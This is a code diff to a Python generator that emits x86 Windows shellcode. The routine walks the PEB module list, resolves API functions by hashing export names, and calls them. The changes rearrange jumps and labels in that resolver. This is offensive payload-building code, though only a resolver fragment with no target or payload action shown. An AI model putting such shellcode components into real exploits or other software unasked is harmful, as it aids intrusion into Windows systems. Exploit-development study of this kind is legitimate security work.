@@ -9,7 +9,7 @@ def generate(key=DEFAULT_HASH_KEY):
     find_and_call_ret:
         pop esi                         // POP the return address from the stack
         mov   [ebp+0x4], esi            // Save find_function address for later usage
-        jmp find_and_call_end
+        jmp find_and_call_hop
 
     find_and_call_shorten_bnc:
         call find_and_call_ret          // Relative CALL with negative offset
@@ -22,11 +22,10 @@ def generate(key=DEFAULT_HASH_KEY):
         mov   esi,[esi+0x1C]            // ESI = PEB->Ldr.InInitOrder
 
     next_module:
+        push  esi                       // Save InInitOrder for next module
         mov   ebx, [esi+0x08]           // EBX = InInitOrder[X].base_address
-        mov   edi, [esi+0x20]           // EDI = InInitOrder[X].module_name
         movzx eax, byte ptr [esi+0x1e]  // EAX = InInitOrder[X].module_name_length
         mov   [ebp-0x8], eax            // Save ModuleNameLength for later
-        push  esi                       // Save InInitOrder for next module
 
     find_function:
         mov   eax, [ebx+0x3C]           // Offset to PE Signature
@@ -52,12 +51,18 @@ def generate(key=DEFAULT_HASH_KEY):
     compute_hash_again:
         lodsb                           // Load the next byte from esi into al
         test  al, al                    // Check for NULL terminator
-        jz    compute_hash_finished     // If the ZF is set, we've hit the NULL term
+        jz    find_function_compare     // If the ZF is set, we've hit the NULL term
         ror   edx, {hex(key)}           // Rotate edx key bits to the right
         add   edx, eax                  // Add the new byte to the accumulator
         jmp   compute_hash_again        // Next iteration
 
-    compute_hash_finished:
+    find_and_call_hop:
+        jmp   find_and_call_end
+
+    get_next_module:
+        pop   esi                       // Restore InInitOrder
+        mov   esi, [esi]                // ESI = InInitOrder[X].flink (next)
+        jmp   next_module
 
     find_function_compare:
         cmp   edx, [esp+0x28]           // Compare the computed hash with the requested hash
@@ -78,11 +83,6 @@ def generate(key=DEFAULT_HASH_KEY):
         pop   edx                       // Remove hash
         push  ecx                       // Set return address
         jmp   eax                       // Call found function
-
-    get_next_module:
-        pop   esi                       // Restore InInitOrder
-        mov   esi, [esi]                // ESI = InInitOrder[X].flink (next)
-        jmp next_module
 
     find_and_call_end:
     """
